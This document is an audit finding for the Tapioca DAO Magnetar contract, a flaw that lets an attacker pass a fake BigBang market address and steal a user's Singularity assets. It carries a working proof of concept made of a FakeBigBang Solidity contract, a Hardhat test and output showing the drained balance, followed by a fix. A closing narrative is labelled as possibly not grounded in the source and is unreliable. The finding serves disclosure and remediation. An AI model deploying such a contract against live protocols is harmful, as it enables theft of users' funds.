---
id: 19098
severity: "High"
---

# User’s assets can be stolen when removing them from the Singularity market through the Magnetar contract

## Description

An Attacker can remove user’s assets from Singularity Markets and steal them to an account of his own by abusing a vulnerability present in the Magnetar contract

## Proof of Concept

* The [`Magnetar::exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L880-L904) can be used to exit from tOB, unlock from tOLP, remove assets from Singularity markets, repay on BigBang markets, remove collateral from BigBang markets and withdraw, each of these steps are optional.
  * When users wants to execute any operation through the Magnetar contract, the Magnetar contracts requires to have the user’s approvals/permissions, that means, when the Magnetar contract executes something on behalf of the user, the Magnetar contract have already been granted permission/allowance on the called contract on the user’s behalf.
  * [When using the Magnetar contract to remove user assets from the Singularity market and use those assets to repay in a BigBang contract](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L568-L635), the Magnetar contract will receive the removed assets from the Singularity Market, grant ALL allowance to the BigBang contract in the YieldBox, and finally will call the BigBang.repay().
  * The problem is that none of the two markets are checked to ensure that they are valid and supported contracts by the Protocol.
  * This attack requires that an attacker creates a FakeBigBang contract (see Step 2 of the Coded PoC mini section!), and passes the address of this Fake BigBang contract as the address of the BigBang where the repayment will be done.

    * When the execution is forwarded to the FakeBigBang contract, the Magnetar contract had already granted ALL allowance to this Fake contract in the YieldBox, which makes possible to do a `YieldBox.transfer()` from the Magnetar contract to an account owned by the attacker.

      * The transferred assets from the Magnetar contract are the assets of the user that were removed from the Singularity market and that they were supposed to be used to repay the user’s debt on the BigBang contract

  * I coded a PoC using the [`magnetar.test.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/magnetar.test.ts) file as the base for this PoC.
  * The first step is to add the `attacker` account in the [`test.utils.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/test.utils.ts) file

```diff
git diff --no-index test.utils.ts testPoC.utils.ts

diff --git a/test.utils.ts b/testPoC.utils.ts
index 00fc388..83107e6 100755
--- a/test.utils.ts
+++ b/testPoC.utils.ts
@@ -1023,8 +1023,14 @@ export async function register(staging?: boolean) {
         ethers.provider,
     );

+    const attacker = new ethers.Wallet(
+        ethers.Wallet.createRandom().privateKey,
+        ethers.provider,
+    );
+
     if (!staging) {
         await setBalance(eoa1.address, 100000);
+        await setBalance(attacker.address, 100000);
     }

     // ------------------- Deploy WethUSDC mock oracle -------------------
@@ -1314,6 +1320,7 @@ export async function register(staging?: boolean) {

     if (!staging) {
         await setBalance(eoa1.address, 100000);
+        await setBalance(attacker.address, 100000);
     }

     const initialSetup = {
@@ -1341,6 +1348,7 @@ export async function register(staging?: boolean) {
         _sglLeverageModule,
         magnetar,
         eoa1,
+        attacker,
         multiSwapper,
         singularityFeeTo,
         liquidationQueue,
```

  2. Now, let’s create the `FakeBigBang` contract, make sure to create it under the [`tapioca-periph-audit/contract/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/contracts) folder

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol";

//YIELDBOX
import "tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol";

import "./interfaces/IYieldBoxBase.sol";
import "./interfaces/IMarket.sol";

contract FakeBigBang {
  // using RebaseLibrary for Rebase;

  IMarket realSingularityMarket;

  IYieldBoxBase public yieldBox;
  
  /// @notice collateral token address
  address public collateral;
  /// @notice collateral token YieldBox id
  uint256 public collateralId;
  /// @notice asset token address
  address public asset;
  /// @notice asset token YieldBox id
  uint256 public assetId;

  uint256 public tOLPSglAssetId;

  address magnetarContract;
  
  function setMarket(address _realSingularityMarket) external {
    realSingularityMarket = IMarket(_realSingularityMarket);

    collateral = realSingularityMarket.collateral();
    collateralId = realSingularityMarket.collateralId();
    asset = realSingularityMarket.asset();
    assetId = realSingularityMarket.assetId();
    yieldBox = IYieldBoxBase(realSingularityMarket.yieldBox());
  }

  function setMagnetar(address _magnetar) external {
    magnetarContract = _magnetar;
  }

  //@audit => This is the function that will be called by the Magnetar contract
  //@audit => This contract will be granted all permission over the Mangetar contract in the YieldBox, which will allow it to transfer all that Magnetar owns to any address
  //@audit-info => repay() will transfer the singularity.assetId() from the YieldBox!
  function repay(
      address from,
      address to,
      bool skim,
      uint256 part
  ) external returns (uint256 amount) {

    uint magnetarAssetBalance = yieldBox.balanceOf(magnetarContract,assetId);
    yieldBox.transfer(magnetarContract, address(this), assetId, magnetarAssetBalance);

    amount = type(uint256).max; 
  }
}
```

  3. Create a new file to reproduce this PoC, magnetar _remove_ assets _from_ singularity_PoC.test.ts
  4. Make sure to create this new test file under the [`tapioca-periph-audit/test/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/test) folder

```solidity
import { expect } from 'chai';
import hre, { ethers, config } from 'hardhat';
import { BN, register, getSGLPermitSignature } from './test.utils';
import {
    loadFixture,
    takeSnapshot,
} from '@nomicfoundation/hardhat-network-helpers';

describe('MagnetarV2', () => {

    describe('repay', () => {
      it('should remove asset from Singularity and Attacker will steal those assets', async () => {
        const {
            weth,
            createWethUsd0Singularity,
            wethBigBangMarket,
            usd0,
            usdc,
            bar,
            wethAssetId,
            mediumRiskMC,
            deployCurveStableToUsdoBidder,
            initContracts,
            yieldBox,
            magnetar,
            deployer,
            attacker,
        } = await loadFixture(register);

        await initContracts();

        const usdoStratregy = await bar.emptyStrategies(usd0.address);
        const usdoAssetId = await yieldBox.ids(
            1,
            usd0.address,
            usdoStratregy,
            0,
        );
        const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(
            deployer,
            bar,
            usdc,
            usd0,
            false,
        );
        const { wethUsdoSingularity } = await createWethUsd0Singularity(
            deployer,
            usd0,
            weth,
            bar,
            usdoAssetId,
            wethAssetId,
            mediumRiskMC,
            yieldBox,
            stableToUsdoBidder,
            ethers.utils.parseEther('1'),
            false,
        );

        //@audit => Attacker deploys the FakeBigBang contract!
        const fakeBigBang = await ethers.deployContract("FakeBigBang");

        await fakeBigBang.setMarket(wethUsdoSingularity.address);  
        await fakeBigBang.setMagnetar(magnetar.address);

        const borrowAmount = ethers.BigNumber.from((1e18).toString()).mul(
            100,
        );
        const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
            10,
        );

        await usd0.mint(deployer.address, borrowAmount.mul(2));
        // We get asset
        await weth.freeMint(wethMintVal);

        // Approve tokens
        // await approveTokensAndSetBarApproval();
        await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true);
        await wethBigBangMarket.updateOperator(magnetar.address, true);
        await weth.approve(magnetar.address, wethMintVal);
        await wethUsdoSingularity.approve(
            magnetar.address,
            ethers.constants.MaxUint256,
        );
        await wethBigBangMarket.approveBorrow(
            magnetar.address,
            ethers.constants.MaxUint256,
        );

        await magnetar.mintFromBBAndLendOnSGL(
            deployer.address,
            borrowAmount,
            {
                mint: true,
                mintAmount: borrowAmount,
                collateralDepositData: {
                    deposit: true,
                    amount: wethMintVal,
                    extractFromSender: true,
                },
            },
            {
                deposit: false,
                amount: 0,
                extractFromSender: false,
            },
            {
                lock: false,
                amount: 0,
                lockDuration: 0,
                target: ethers.constants.AddressZero,
                fraction: 0,
            },
            {
                participate: false,
                target: ethers.constants.AddressZero,
                tOLPTokenId: 0,
            },
            {
                singularity: wethUsdoSingularity.address,
                magnetar: magnetar.address,
                bigBang: wethBigBangMarket.address,
            },
        );

        await usd0.approve(yieldBox.address, ethers.constants.MaxUint256);
        await yieldBox.depositAsset(
            usdoAssetId,
            deployer.address,
            deployer.address,
            borrowAmount,
            0,
        );
        const wethCollateralBefore =
            await wethBigBangMarket.userCollateralShare(deployer.address);
        const fraction = await wethUsdoSingularity.balanceOf(
            deployer.address,
        );

        const assetId = await wethUsdoSingularity.assetId();
        
        console.log("asset in YieldBox owned by Magnetar - BEFORE: ", await yieldBox.balanceOf(magnetar.address,assetId));
        console.log("asset in YieldBox owned by User - BEFORE: ", await yieldBox.balanceOf(deployer.address,assetId));
        console.log("asset in YieldBox owned by FakeBigBang - BEFORE: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));

        //@audit => magnetar contract already has been approved by the deployer contract to perform the removed asset operation in the Singularity Market
        //@audit => The `attacker` executed the attack over the `deployer` address
        //@audit => attacker will remove assets from the deployer in the Singularity market, and will transfer those assets to an account of his own by using a FakeBigBang contract!
        await magnetar.connect(attacker).exitPositionAndRemoveCollateral(
            deployer.address,
            {
                magnetar: magnetar.address,
                singularity: wethUsdoSingularity.address,
                // bigBang: wethBigBangMarket.address,
                bigBang: fakeBigBang.address,
            },
            {
                removeAssetFromSGL: true,
                removeShare: fraction.div(2),
                repayAssetOnBB: true,
                repayAmount: await yieldBox.toAmount(
                    usdoAssetId,
                    fraction.div(3),
                    false,
                ),
                removeCollateralFromBB: false,
                collateralShare: 0,
                exitData: {
                    exit: false,
                    oTAPTokenID: 0,
                    target: ethers.constants.AddressZero,
                },
                unlockData: {
                    unlock: false,
                    target: ethers.constants.AddressZero,
                    tokenId: 0,
                },
                assetWithdrawData: {
                    withdraw: false,
                    withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),
                    withdrawLzChainId: 0,
                    withdrawLzFeeAmount: 0,
                    withdrawOnOtherChain: false,
                },
                collateralWithdrawData: {
                    withdraw: false,
                    withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),
                    withdrawLzChainId: 0,
                    withdrawLzFeeAmount: 0,
                    withdrawOnOtherChain: false,
                },
            },
        );
        console.log("\n\n=======================================================================\n\n");
        console.log("asset in YieldBox owned by Magnetar - AFTER: ", await yieldBox.balanceOf(magnetar.address,assetId));
        console.log("asset in YieldBox owned by User - AFTER: ", await yieldBox.balanceOf(deployer.address,assetId));
        console.log("asset in YieldBox owned by FakeBigBang - AFTER: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));

      });
    });

});
```

  4. After all the 3 previous steps have been completed, everything is ready to run the PoC.

> npx hardhat test magnetar _remove_ assets _from_ singularity_PoC.test.ts

```
  MagnetarV2
    repay
asset in YieldBox owned by Magnetar - BEFORE:  BigNumber { value: "0" }
asset in YieldBox owned by User - BEFORE:  BigNumber { value: "10000000000000000000000000000" }
asset in YieldBox owned by FakeBigBang - BEFORE:  BigNumber { value: "0" }

=======================================================================

asset in YieldBox owned by Magnetar - AFTER:  BigNumber { value: "0" }
asset in YieldBox owned by User - AFTER:  BigNumber { value: "10000000000000000000000000000" }
asset in YieldBox owned by FakeBigBang - AFTER:  BigNumber { value: "5000000000000000000000000000" }
      ✔ should remove asset from Singularity and Attacker will steal those assets (14114ms)
```

## Recommendation

* Use the Penrose contract to validate that the provided markets as parameters are real markets supported by the protocol (Both, BB & Singularity markets)
  * Add the below checks on the [`_exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L495-L675) function

```solidity
function _exitPositionAndRemoveCollateral(
    address user,
    ICommonData.ICommonExternalContracts calldata externalData,
    IUSDOBase.IRemoveAndRepay calldata removeAndRepayData
) private {
    require(penrose.isMarketRegistered(externalData.bigBang), "BigBang market is not a valid market supported by the protocol");
    require(penrose.isMarketRegistered(externalData.singularity), "Singularity market is not a valid market supported by the protocol");
    
    IMarket bigBang = IMarket(externalData.bigBang);
    ISingularity singularity = ISingularity(externalData.singularity);
    IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());

    ...
    ...
    ...
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the Magnetar contract's exitPositionAndRemoveCollateral function, which orchestrates removal of assets from a Singularity market, grants the BigBang contract an unlimited allowance in the YieldBox, and then calls BigBang.repay. Because the function does not verify that the supplied BigBang address corresponds to a legitimate, protocol‑registered market, an attacker can supply a malicious contract (FakeBigBang). When the Magnetar contract executes, it first withdraws the user's collateral from the Singularity market, then approves the attacker‑controlled contract for the full token balance in the YieldBox. The malicious contract’s repay function uses the granted allowance to transfer the withdrawn assets from the Magnetar’s YieldBox balance to an address owned by the attacker, effectively stealing the user's funds. This can be triggered whenever a user invokes Magnetar to exit a position and remove collateral, provided the user has given the Magnetar contract the necessary approvals on the Singularity market and the YieldBox. The affected parties are any user who relies on Magnetar to manage positions across Singularity and BigBang markets; their assets can disappear from their account and appear in the attacker’s address. The issue was discovered during a manual audit that examined the flow of approvals and noticed the absence of market registration checks, and was demonstrated with a proof‑of‑concept that deployed a fake BigBang contract and observed the transfer of assets. The bug is subtle because the Magnetar contract correctly performs the intended operations, and the allowance grant appears legitimate; only the unchecked destination contract makes the transfer malicious, which can be missed if the auditor does not trace external calls. The vulnerability belongs to the class of untrusted contract address injection or missing validation of external contract parameters, leading to unauthorized asset movement. From a user’s perspective the UI would show a successful exit of a position, but the balance of the token would suddenly drop to zero or a reduced amount, while the attacker’s address receives the missing tokens. The business logic that assumes the repayment will be performed on a trusted BigBang market is violated, breaking accounting guarantees. The recommended mitigation is to validate that both the Singularity and BigBang addresses are registered markets via the Penrose contract before any asset transfer, and to limit the allowance granted to the exact amount needed for repayment rather than an unlimited approval.
